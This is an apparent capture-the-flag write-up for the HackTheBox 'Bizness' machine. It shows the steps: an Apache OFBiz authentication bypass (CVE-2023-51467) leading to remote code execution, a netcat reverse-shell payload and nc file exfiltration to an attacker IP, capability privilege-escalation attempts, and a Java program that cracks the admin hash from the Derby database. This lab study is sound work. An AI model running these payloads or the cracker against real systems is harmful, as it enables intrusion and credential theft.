# NMAP

```
sudo nmap 10.129.177.0 -sC
[sudo] password for angelo: 
Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-07 10:20 CET
Nmap scan report for 10.129.177.0
Host is up (0.42s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
| ssh-hostkey: 
|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
80/tcp  open  http
|_http-title: Did not follow redirect to https://bizness.htb/
443/tcp open  https
|_ssl-date: TLS randomness does not represent time
| tls-nextprotoneg: 
|_  http/1.1
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK
| Not valid before: 2023-12-14T20:03:40
|_Not valid after:  2328-11-10T20:03:40
|_http-title: Did not follow redirect to https://bizness.htb/
```

# USER

doing an ffuf for enumeration returns the following interesting files

```
ffuf -w ~/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u https://bizness.htb/FUZZ -r -fs 27200
```

```
content                 [Status: 200, Size: 11177, Words: 1222, Lines: 187, Duration: 702ms]
catalog                 [Status: 200, Size: 11330, Words: 1239, Lines: 188, Duration: 715ms]
marketing               [Status: 200, Size: 11097, Words: 1211, Lines: 186, Duration: 325ms]
ecommerce               [Status: 200, Size: 530, Words: 55, Lines: 9, Duration: 622ms]
ap                      [Status: 200, Size: 11077, Words: 1211, Lines: 186, Duration: 489ms]
ar                      [Status: 200, Size: 11077, Words: 1211, Lines: 186, Duration: 241ms]
ebay                    [Status: 200, Size: 11053, Words: 1209, Lines: 186, Duration: 368ms]
control                 [Status: 200, Size: 34633, Words: 10468, Lines: 492, Duration: 258ms]
manufacturing           [Status: 200, Size: 11149, Words: 1211, Lines: 186, Duration: 464ms]
example                 [Status: 200, Size: 11153, Words: 1220, Lines: 188, Duration: 465ms]
bi                      [Status: 200, Size: 11058, Words: 1211, Lines: 186, Duration: 653ms]
accounting              [Status: 200, Size: 11103, Words: 1211, Lines: 186, Duration: 465ms]
webtools                [Status: 200, Size: 9851, Words: 1003, Lines: 154, Duration: 593ms]
```

We can't filter on response code so i filtered on response size.
We find useless endpoints but one seems to be interesting: `webtools` which redirects to `https://bizness.htb/webtools/control/main`

The page says:

```
For something interesting make sure you are logged in, try username: admin, password: ofbiz.

NOTE: If you have not already run the installation data loading script, from the ofbiz home directory run "gradlew loadAll" or "java -jar build/libs/ofbiz.jar -l"
```

A login is present, but trying the with credentials `admin:ofbiz` seems not working.

In the footer of the page we find the following information

```
Copyright (c) 2001-2024 The Apache Software Foundation. Powered by Apache OFBiz. Release 18.12
```

And searching for ofbiz vulnerabilities led me to find a recent CVE.

https://threatprotect.qualys.com/2023/12/27/apache-ofbiz-authentication-bypass-vulnerability-cve-2023-51467/

The exploit is pretty simple and talks about bypassing authentication requirements by simpling using `requirePasswordChange=Y`
as `GET` parameter in each request.

Executing a `poc` for detecing the vulnerability returns the following:

```
[10:43:57] Vulnerable URL found: https://bizness.htb, Response: PONG
```

It seems vulnerable, and in fact using burpsuite we can access `https://bizness.htb/webtools/control/ping?FUZZUSERNAME=&PASSWORD=&requirePasswordChange=Y`
which should be authenticated.

Ping looks like a bash command, let's fuzz for other interesting files using the auth bypass in the while

`ffuf -w ~/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u 'https://bizness.htb/webtools/control/FUZZ?USERNAME=&PASSWORD=&requirePasswordChange=Y' -fl 492`

Filtering for file lines response.

```
login                   [Status: 200, Size: 11536, Words: 1295, Lines: 195, Duration: 987ms]
help                    [Status: 200, Size: 3985, Words: 320, Lines: 49, Duration: 879ms]
security                [Status: 200, Size: 9819, Words: 986, Lines: 149, Duration: 834ms]
main                    [Status: 200, Size: 9851, Words: 1003, Lines: 154, Duration: 805ms]
view                    [Status: 200, Size: 9851, Words: 1003, Lines: 154, Duration: 598ms]
yahoo                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 419ms]
logout                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 431ms]
views                   [Status: 200, Size: 9851, Words: 1003, Lines: 154, Duration: 556ms]
ping                    [Status: 200, Size: 6, Words: 1, Lines: 3, Duration: 759ms]
forgotPassword          [Status: 200, Size: 11081, Words: 1443, Lines: 175, Duration: 394ms]
xmlrpc                  [Status: 200, Size: 369, Words: 14, Lines: 1, Duration: 410ms]
chain                   [Status: 200, Size: 9851, Words: 1003, Lines: 154, Duration: 469ms]
```

We have `xmlrpc` which can be useful for achieving `RCE`.

Searching for infos on internet I found a working-in-progress pr for a nuclei scanner

https://github.com/projectdiscovery/nuclei-templates/pull/8895

which led me to find the a valid POC by the `PR` author

https://github.com/JaneMandy/CVE-2023-51467/blob/main/exp.py

Using the following command led me to get a callback.
I called the exploit `exploit.py` in this directory.

```
wget http://10.10.16.28:1234/test

CALLBACK RECEVIED ON nc -lvnp 1234
```

rce confirmed

working paylaod for reverse shell: `nc -c sh 10.10.16.28 1234`

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
ctrl+z
stty raw -echo
fg
```

we're already ofbiz and we can get the user flag.

# ROOT

Let's run `lse.sh` and `linpeas.sh`

```
[!] sec020 Can we write to a binary with caps?............................. yes!
---                                                                                                       
/home/ofbiz/l/python3  
```

```
[+] [CVE-2021-3490] eBPF ALU32 bounds tracking for bitwise ops

   Details: https://www.graplsecurity.com/post/kernel-pwning-with-ebpf-a-love-story
   Exposure: probable
   Tags: ubuntu=20.04{kernel:5.8.0-(25|26|27|28|29|30|31|32|33|34|35|36|37|38|39|40|41|42|43|44|45|46|47|48|49|50|51|52)-*},ubuntu=21.04{kernel:5.11.0-16-*}
   Download URL: https://codeload.github.com/chompie1337/Linux_LPE_eBPF_CVE-2021-3490/zip/main
   Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1

[+] [CVE-2022-0847] DirtyPipe

   Details: https://dirtypipe.cm4all.com/
   Exposure: probable
   Tags: ubuntu=(20.04|21.04),[ debian=11 ]
   Download URL: https://haxx.in/files/dirtypipez.c
```

but these exploit seems to not be useful in our situation.

Instead let's analyze the binary previously found

```
getcap ./python3
./python3 cap_setuid=eip
```

```
The Linux capabilities are a way to grant specific privileges to processes without giving them full root (superuser) access. Each capability represents a specific subset of the overall privileges that root has. The cap_setuid capability is related to the ability to change the user ID (UID) of a process.

In your case, cap_setuid=eip means that the process has the following capabilities:

    Effective (e): The process can change its UID. This allows the process to temporarily drop its privileges to a lower-privileged user.

    Inheritable (i): The capability is inheritable across exec calls. If the process spawns a new executable, the new process will also have this capability.

    Permitted (p): The capability is permitted. This is the basic set of capabilities that a process can use.

If a process with cap_setuid capability sets its UID to root, it won't have the broad range of powers that a process running as a true root user would have. The process will only have the capabilities explicitly granted to it, and it will still be subject to other restrictions imposed by the system.
```

so by reading some tricks https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_setuid

i tried to escapate privileges withihn the binary:

```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
####   PERMISSION DENIED

os.setuid(0)
os.system("/bin/bash")
```

but this has leads in a permission denied. The exploit seems not working. That's not the way to get root probably.

With the help of chat gpt and google, what i want to do now is try to access some dbs to retrivie passwords.

cahtgpt says that password for db for ofbiz should be stored in a file called `entityengine.xml`

Let's try to search with find for such file

```
find ./ -iname 'entityengine.xml'

./framework/entity/config/entityengine.xml
```

Download the file

```bash
receive file: nc -l -p 12344 > entityengine.xml
send file: nc 10.10.16.28 12344 < entityengine.xml 
```

It seems confusing, there are a lot of information which seems to be misleading. There are templates of auth requirements for all 
kind of dbs. This seems to be a default template file and does not seem to be that useful.

Searching on internet for some additional information, I came across ofbiz documentation, which talks about a db called `derby`.
You can connect whatver type of db to ofbiz but the prefered one seems to be `derby`, created by the Apache Foundations itself.

I don't have the minimal idea what this db is, and how I can access it.

Searching for keyword `derby` I found the following:

```
find ./ -iname 'derby'

./runtime/data/derby
```

```bash
tar czf /tmp/derby.tar.gz derby
receive file: nc -l -p 12344 > derby.tar.gz
send file: nc 10.10.16.28 12344 < derby.tar.gz
```

the directory contains a lot of files and inside internal directories there is a `README_DO_NOT_TOUCH_FILES.txt` which says

```
# *************************************************************************
# ***              DO NOT TOUCH FILES IN THIS DIRECTORY!                ***
# *** FILES IN THIS DIRECTORY AND SUBDIRECTORIES CONSTITUTE A DERBY     ***
# *** DATABASE, WHICH INCLUDES THE DATA (USER AND SYSTEM) AND THE       ***
# *** FILES NECESSARY FOR DATABASE RECOVERY.                            ***
# *** EDITING, ADDING, OR DELETING ANY OF THESE FILES MAY CAUSE DATA    ***
# *** CORRUPTION AND LEAVE THE DATABASE IN A NON-RECOVERABLE STATE.     ***
# *************************************************************************
```

this seems pretty interesting. This means that the entire content under this `derby` directory is the database itself, but how
we can navigate it?

Searching again on internet I came across Apache Foundations documentations which talked about a command line client for navigating
`derby` databases. It is called `ij` and we need to download it as binary. 

I downlaoded `db-derby-10.16.1.1-bin` and insede `bin` i found `ij`.

Reading to documentation the syntax to connect to a database (and if exists use it) is the following:

```
ij version 10.16                                                                                                                                                                                                    
ij> CONNECT 'jdbc:derby:/home/angelo/HTB/BIZNESS/assets/derby/ofbiz;create=true';                                                                                                                                   
WARNING 01J01: Database '/home/angelo/HTB/BIZNESS/assets/derby/ofbiz' not created, connection made to existing database instead. 
```

The connections seems to have been enstablished succesfully.

Let's naviagate using the syntax pretty similar to `mysql` syntax.

```
show tables;
SELECT TABLENAME FROM SYS.SYSTABLES WHERE TABLENAME LIKE '%USER%';
```

we need to use schema for access tables. from `show tables` we can see for each table its schema. 

`select * from ofbiz.USER_LOGIN;`

gives an hash for user `admin`

`$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I`

The hash seems to be not a common hash.
Probably it's handled internally manually somehow.

To understand how to decrypt it we need to take a look at the code which handles the hash.

The class wich handles hashes is the following:

https://github.com/apache/ofbiz/blob/trunk/framework/base/src/main/java/org/apache/ofbiz/base/crypto/HashCrypt.java

The logic is confused but what we have to do is something like this:

- encrypt password like shown in https://github.com/apache/ofbiz/blob/trunk/framework/base/src/main/java/org/apache/ofbiz/base/crypto/HashCrypt.java
   - to do so we have to look at `cryptBytes` function which calls internally `getCryptedBytes`.
- compare each encrypted password from wordlist with the hash we want to crack
- if match -> return password

I tried to create a script called `decrypt.py` but methods from pythond to java differs how encodings are handled.
So i had to use java anyway.

The code which does the work is the following:


```java
import org.apache.commons.codec.binary.Base64;

import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;

import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;

public class Main{

    public static void main(String[] args){
        String filepath = "/home/angelo/SecLists/rockyou.txt";
        String original_hash = "$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I";
        String algo = "SHA";
        String salt = "d";
        
        try (BufferedReader reader = new BufferedReader(new FileReader(filepath))) {
            String line;
            while ((line = reader.readLine()) != null) {
                try{
                    String result = cryptBytes(algo, salt, line.getBytes());
                    if (original_hash.equals(result)){
                        System.out.println("FONUD "+ line +" valid for the hash " + result);

                        System.exit(0);
                    }
                } catch (Exception e) {
                    System.out.println(e);
                    System.exit(-1);
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static String cryptBytes(String hashType, String salt, byte[] bytes) throws Exception{
        StringBuilder sb = new StringBuilder();
        sb.append("$").append(hashType).append("$").append(salt).append("$");
        sb.append(getCryptedBytes(hashType, salt, bytes));
        return sb.toString();
    }


    private static String getCryptedBytes(String hashType, String salt, byte[] bytes) throws Exception {
        try {
            MessageDigest messagedigest = MessageDigest.getInstance(hashType);
            messagedigest.update(salt.getBytes());
            messagedigest.update(bytes);
            return Base64.encodeBase64URLSafeString(messagedigest.digest()).replace('+', '.');
        } catch (Exception e) {
            throw new Exception("Error while comparing password", e);
        }
    }

}
```

Compile and run, must have `commons-codec-1.16.0.jar` downloaded for apache encoding dependency.

```bash
cd decryptor
javac -cp ../commons-codec-1.16.0.jar Main.java
java -cp ../commons-codec-1.16.0.jar:. Main

FONUD monkeybizness valid for the hash $SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I
```

from our reverse shell doing a `su root` with the password lets us to become root.